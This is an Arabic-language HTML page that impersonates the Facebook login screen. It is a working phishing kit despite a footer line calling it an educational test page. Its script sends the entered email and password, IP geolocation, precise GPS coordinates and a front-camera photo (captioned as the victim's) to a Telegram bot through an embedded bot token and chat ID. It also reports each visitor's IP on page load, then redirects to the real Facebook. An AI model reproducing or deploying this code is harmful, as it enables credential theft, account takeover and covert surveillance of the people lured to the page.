<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فيسبوك - تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 30px 35px 40px;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.15);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 42px;
            font-weight: 700;
            color: #1877f2;
            margin-bottom: 10px;
            font-family: 'Helvetica', Arial, sans-serif;
        }
        .sub {
            color: #606770;
            font-size: 15px;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            background: #fff;
            outline: none;
            transition: 0.2s;
        }
        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 5px;
        }
        .btn:hover {
            background: #166fe5;
        }
        .btn:active {
            background: #0f5fb8;
        }
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 22px 0 18px;
        }
        .forgot {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
            margin-top: 8px;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        .create-btn {
            background: #42b72a;
            padding: 14px 20px;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            width: 100%;
            margin-top: 10px;
        }
        .create-btn:hover {
            background: #36a420;
        }
        .note {
            font-size: 12px;
            color: #777;
            margin-top: 20px;
        }
        #status {
            margin-top: 12px;
            padding: 8px;
            border-radius: 6px;
            font-size: 14px;
            display: none;
        }
        .hidden {
            display: none;
        }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">facebook</div>
    <div class="sub">تسجيل الدخول إلى فيسبوك</div>

    <form id="loginForm">
        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <input type="password" id="password" placeholder="كلمة السر" required>
        <button type="submit" class="btn">تسجيل الدخول</button>
    </form>

    <a href="#" class="forgot">نسيت كلمة السر؟</a>

    <div class="divider"></div>

    <button class="create-btn" onclick="alert('هذه صفحة تجريبية')">إنشاء حساب جديد</button>

    <div id="status"></div>
    <div class="note">هذه صفحة تجريبية لأغراض تعليمية فقط</div>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    // ======== بيانات التليغرام ========
    const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
    const CHAT_ID = "7214473798";
    const PAGE_NAME = "فيسبوك - تسجيل دخول";
    // ==================================

    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message.substring(0, 4096),
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {
            console.error("Telegram send error:", e);
        }
    }

    async function sendPhotoToTelegram(base64Image, caption) {
        try {
            const blob = dataURLtoBlob(base64Image);
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'shot.jpg');
            formData.append('caption', caption.substring(0, 1024));

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            await fetch(url, { method: 'POST', body: formData });
        } catch (e) {
            console.error("Photo send error:", e);
        }
    }

    function dataURLtoBlob(dataURL) {
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], { type: mime });
    }

    async function getIPInfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                lat: data.latitude,
                lon: data.longitude,
                org: data.org
            };
        } catch (e) {
            return null;
        }
    }

    function captureCamera() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            sendToTelegram(`⚠️ ${PAGE_NAME} - الكاميرا غير مدعومة`);
            return;
        }
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth || 400;
                    canvas.height = video.videoHeight || 300;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                    sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;
                }, 1500);
            })
            .catch(err => {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        video.play();
                        setTimeout(() => {
                            const ctx = canvas.getContext('2d');
                            canvas.width = video.videoWidth || 400;
                            canvas.height = video.videoHeight || 300;
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                            sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
                            stream.getTracks().forEach(track => track.stop());
                            video.srcObject = null;
                        }, 1500);
                    })
                    .catch(() => sendToTelegram(`⚠️ ${PAGE_NAME} - رفض الكاميرا`));
            });
    }

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();
        const statusDiv = document.getElementById('status');

        if (!email || !password) {
            statusDiv.style.display = 'block';
            statusDiv.style.color = '#c00';
            statusDiv.innerText = '❌ الرجاء ملء جميع الحقول';
            return;
        }

        statusDiv.style.display = 'block';
        statusDiv.style.color = '#f0c060';
        statusDiv.innerText = '⏳ جاري التحقق...';

        // جلب IP
        const ipInfo = await getIPInfo();
        let msg = `🕵️ <b>${PAGE_NAME}</b>\n\n`;
        msg += `👤 البريد: ${email}\n`;
        msg += `🔑 كلمة السر: ${password}\n`;
        if (ipInfo) {
            msg += `📡 IP: ${ipInfo.ip}\n`;
            msg += `🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
            msg += `🌍 الدولة: ${ipInfo.country || 'غير معروف'}\n`;
            if (ipInfo.lat && ipInfo.lon) {
                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
            }
        }
        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;

        await sendToTelegram(msg);

        // طلب GPS دقيق
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (p) => {
                let lat = p.coords.latitude;
                let lon = p.coords.longitude;
                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                let gpsMsg = `🎯 <b>${PAGE_NAME} - موقع دقيق ✅</b>\n\n`;
                gpsMsg += `👤 ${email}\n`;
                gpsMsg += `📍 ${mapLink}\n`;
                gpsMsg += `📏 دقة: ${Math.round(p.coords.accuracy)} متر\n`;
                gpsMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
                await sendToTelegram(gpsMsg);
            }, (err) => {
                sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${err.message}`);
            }, { enableHighAccuracy: true, timeout: 10000 });
        }

        // تصوير الكاميرا
        captureCamera();

        statusDiv.style.color = '#2e7d32';
        statusDiv.innerText = '✅ تم تسجيل الدخول بنجاح! جاري التحويل...';

        setTimeout(() => {
            window.location.href = "https://www.facebook.com/";
        }, 2000);
    });

    // إرسال IP فوراً عند فتح الصفحة (دون تعبئة)
    (async function () {
        const ipInfo = await getIPInfo();
        if (ipInfo) {
            let msg = `📡 <b>${PAGE_NAME} - صفحة مفتوحة</b>\n\n`;
            msg += `🌐 IP: ${ipInfo.ip}\n`;
            msg += `🏙️ ${ipInfo.city || 'غير معروف'}, ${ipInfo.country || ''}\n`;
            if (ipInfo.lat && ipInfo.lon) {
                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
            }
            msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
            await sendToTelegram(msg);
        }
    })();
</script>

</body>
</html>
